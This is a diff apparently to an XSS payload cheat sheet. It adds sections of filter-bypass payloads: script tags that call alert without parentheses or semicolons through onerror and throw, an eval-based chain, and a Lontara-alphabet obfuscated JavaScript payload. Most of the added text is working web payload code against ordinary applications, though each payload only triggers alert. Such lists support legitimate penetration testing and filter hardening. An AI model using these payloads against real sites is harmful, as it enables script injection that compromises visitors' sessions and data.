@@ -28,6 +28,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [Bypass quotes in mousedown event](#bypass-quotes-in-mousedown-event)
   - [Bypass dot filter](#bypass-dot-filter)
   - [Bypass parenthesis for string](#bypass-parenthesis-for-string)
+  - [Bypass parenthesis and semi colon](#bypass-parenthesis-and-semi-colon)
   - [Bypass onxxxx= blacklist](#bypass-onxxxx---blacklist)
   - [Bypass space filter](#bypass-space-filter)
   - [Bypass email filter](#bypass-email-filter)
@@ -39,6 +40,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [Bypass ";" using another character](#bypass-using------using-another-character)
   - [Bypass using HTML encoding](#bypass-using-html-encoding)
   - [Bypass using Katana](#bypass-using-katana)
+  - [Bypass using Lontara](#bypass-using-lontara)
   - [Bypass using ECMAScript6](#bypass-using-ecmascript6)
   - [Bypass using Octal encoding](#bypass-using-octal-encoding)
   - [Bypass using Unicode](#bypass-using-unicode)
@@ -525,6 +527,21 @@ alert`1`
 setTimeout`alert\u0028document.domain\u0029`;
 ```
 
+### Bypass parenthesis and semi colon
+
+```javascript
+// From @garethheyes
+<script>onerror=alert;throw 1337</script>
+<script>{onerror=alert}throw 1337</script>
+<script>throw onerror=alert,'some string',123,'haha'</script>
+
+// From @terjanq 
+<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+
+// From @cgvwzq
+<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+```
+
 ### Bypass onxxxx= blacklist
 
 ```javascript
@@ -703,6 +720,14 @@ Using the [Katakana](https://github.com/aemkei/katakana.js) library.
 ```javascript
 javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
 ```
+
+### Bypass using Lontara
+
+```javscript
+ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
+```
+
+More alphabets on http://aem1k.com/aurebesh.js/#
 
 ### Bypass using ECMAScript6
 
